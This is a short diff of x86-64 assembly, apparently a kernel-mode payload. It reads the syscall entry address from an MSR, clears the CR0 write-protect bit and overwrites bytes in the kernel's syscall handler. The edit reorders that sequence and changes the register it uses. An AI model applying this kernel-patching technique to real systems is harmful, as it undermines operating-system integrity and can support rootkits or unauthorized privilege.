@@ -54,13 +54,14 @@ MSR_SYSCALL_TARGET equ 0xc0000082
 
 
 entry:
-    mov rbx, cr0
-    and rbx, ~X86_CR0_WP
-    mov cr0, rbx
     mov ecx, MSR_SYSCALL_TARGET
     rdmsr
     shl rdx, 32
     or  rax, rdx
+
+    mov rdx, cr0
+    and rdx, ~X86_CR0_WP
+    mov cr0, rdx
 
     cld
 
@@ -81,5 +82,5 @@ entry:
     mov byte  [rax + off_len6], 12
     mov byte  [rax + off_len7], 12
 
-    mov cr0, rbx
+    mov cr0, rdx
 
